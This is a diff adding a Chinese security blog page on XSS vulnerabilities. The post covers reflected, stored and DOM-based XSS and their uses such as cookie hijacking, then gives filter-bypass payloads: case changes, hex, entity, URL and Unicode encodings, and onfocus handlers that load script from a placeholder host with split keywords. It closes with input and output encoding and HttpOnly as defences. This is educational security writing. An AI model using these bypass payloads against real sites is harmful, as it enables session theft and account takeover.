@@ -1,0 +1,252 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>XSS漏洞 | Gridea</title>
+<link rel="shortcut icon" href="https://piaogexu.github.io/favicon.ico?v=1606548080714">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://piaogexu.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="XSS漏洞 | Gridea - Atom Feed" href="https://piaogexu.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="XSS漏洞
+介绍
+XSS是Web安全中最常见的漏洞，XSS全称是Cross Site Script。XSS攻击通常指黑客通过“HTML注入”篡改了网页，插入了恶意脚本，从而控制用户浏览的一种攻击。
+这里的跨站访问，可以是从正常的网站跨到黑客..." />
+    <meta name="keywords" content="" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://piaogexu.github.io">
+  <img class="avatar" src="https://piaogexu.github.io/images/avatar.png?v=1606548080714" alt="">
+  </a>
+  <h1 class="site-title">
+    Gridea
+  </h1>
+  <p class="site-description">
+    温故而知新
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              XSS漏洞
+            </h2>
+            <div class="post-info">
+              <span>
+                2020-11-28
+              </span>
+              <span>
+                5 min read
+              </span>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content">
+                <h4 id="xss漏洞">XSS漏洞</h4>
+<h5 id="介绍">介绍</h5>
+<p>XSS是Web安全中最常见的漏洞，XSS全称是<code>Cross Site Script</code>。XSS攻击通常指黑客通过“<code>HTML注入</code>”篡改了网页，插入了恶意脚本，从而控制用户浏览的一种攻击。<br>
+这里的跨站访问，可以是从正常的网站跨到黑客的服务器，也可以是黑客的服务器跨到正常的网站。<br>
+XSS漏洞经常出现在需要用户输入的地方，这些地方一旦对输入不进行处理，黑客就可以进行HTML注入，进而篡改网页。</p>
+<p>XSS根据效果不同可以分为三类</p>
+<pre><code>    反射型XSS(reflected)
+    存储型XSS(stored)
+    DOM Based XSS
+</code></pre>
+<p>反射型和DOM型的攻击代码一般会在url中，经过urlEncode以后，用户很难识别。</p>
+<p>DOM based XSS与前两者完全不同，是纯前端的XSS漏洞，XSS直接通过浏览器进行解析，就完成攻击。</p>
+<p>反射型XSS需要诱骗用户进行点击。而存储型，攻击者已经通过XSS漏洞（基本为输入框）将恶意脚本放入数据库中，只要每次浏览这个网页就会触发恶意脚本。</p>
+<h5 id="应用">应用</h5>
+<p>攻击者的恶意脚本称为XSS payload，下面列举几种常见的xss payload用途：<br>
+1.cookie劫持</p>
+<p>这是最常见的payload,黑客的目标一般就是用户的cookie，或者是root权限。这个攻击会在后面XSS实战中讲解</p>
+<p>2.构造GET与POST请求</p>
+<p>构造GET请求，只需要构造url中？后面的parameter就可以</p>
+<p>POST请求构造一种是form表单的提交，另一种是XMLHttpReuqeust,XMLHttpRequest请求请看我另一篇博客的最后https://blog.csdn.net/qq_41667282/article/details/87216653</p>
+<p>3.XSS钓鱼</p>
+<p>将XSS与钓鱼相结合</p>
+<p>4.识别用户浏览器</p>
+<p>5.刷流量</p>
+<p>6.获取真实ip</p>
+<p>简单的方式可以通过navigator.userAgent获得。</p>
+<p>复杂的可以通过不同浏览器有不同的特点获得。</p>
+<h6 id="xss常见绕过方法">xss常见绕过方法</h6>
+<p>1、改变大小写</p>
+<p>在测试过程中，我们可以改变测试语句的大小写来绕过XSS规则：</p>
+<p>比如：<br>
+<code>&lt;script&gt;alert(“xss”);&lt;/script&gt;</code>可以转换为：<br>
+<code>&lt;ScRipt&gt;ALeRt(“XSS”);&lt;/sCRipT&gt;</code><br>
+关闭标签</p>
+<p>有时候我们需要关闭标签来使我们的XSS生效。</p>
+<p>比如：<code>“&gt;&lt;script&gt;alert(“Hi”);&lt;/script&gt;</code></p>
+<p>2、使用hex编码绕过</p>
+<p>我们可以对我们的语句进行hex编码来绕过XSS规则</p>
+<p>比如：<code>&lt;script&gt;alert(“xss”);&lt;/script&gt;</code>可以转换为：<br>
+<code>%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%78%73%73%22%29%3b%3c%2f%73%63%72%69%70%74%3e</code></p>
+<p>这里即便对传入的参数过滤了&lt;&gt;,XSS还是能发生(前提是该标签属性需要引用文件)<br>
+空格/回车/Tab</p>
+<p>3、html实体编码</p>
+<p><code>&lt;iframe src=javascript:alert(1)&gt;</code></p>
+<p>4、URL编码</p>
+<p><code>&lt;a href=&quot;javascript:%61%6c%65%72%74%28%31%29&quot;&gt;xx&lt;/a&gt;</code></p>
+<p>5、Unicode编码</p>
+<p><code>&lt;input onfocus=location=&quot;javascript:\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029&quot; autofocus&gt;</code></p>
+<p>6、Base64编码</p>
+<p>7、引入外部JS</p>
+<pre><code>1.&lt;script/src='1.js'/~~234*234&gt;&lt;/script ~~234*234&gt;
+2.onfocus='a=document.createElement(&quot;script&quot;);a.src=&quot;http://x.x.x.x&quot;;body.appendChild(a);'
+3.onfocus='a=document.createElement(&quot;scr&quot;+&quot;ipt&quot;);a.src=&quot;http://x.x.x.x&quot;;body.appendChild(a);' //拆分关键字
+4. //SSI
+5.&lt;link%20rel=import%20href=&quot;2.js&quot;&gt;
+</code></pre>
+<h4 id="修复">修复</h4>
+<p>输入点检查：对用户输入的数据进行合法性检查，使用filter过滤敏感字符或对进行编码转义，针对特定类型数据进行格式检查。针对输入点的检查最好放在服务器端实现。<br>
+输出点检查：对变量输出到HTML页面中时，对输出内容进行编码转义，输出在HTML中时，对其进行HTMLEncode，如果输出在Java脚本中时，对其进行JavaEncode。 对使用JavaEncode的变量都放在引号中并转义危险字符，data部分就无法逃逸出引号外成为code的一部分。还可以使用更加严格的方法，对所有数字字母之外的字符都使用十六进制编码。此外，要注意在浏览器中，HTML的解析会优先于Java的解析，编码的方式也需要考虑清楚，针对不同的输出点，我们防御XSS的方法可能会不同，这点可能在之后的文章会做下总结。<br>
+除此之外，还有做HTTPOnly对Cookie劫持做限制。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#xss%E6%BC%8F%E6%B4%9E">XSS漏洞</a>
+<ul>
+<li><a href="#%E4%BB%8B%E7%BB%8D">介绍</a></li>
+<li><a href="#%E5%BA%94%E7%94%A8">应用</a>
+<ul>
+<li><a href="#xss%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95">xss常见绕过方法</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E4%BF%AE%E5%A4%8D">修复</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://piaogexu.github.io/post/cobalt-strike-shi-yong-jiao-cheng/">
+              <h3 class="post-title">
+                Cobalt Strike使用教程
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://piaogexu.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
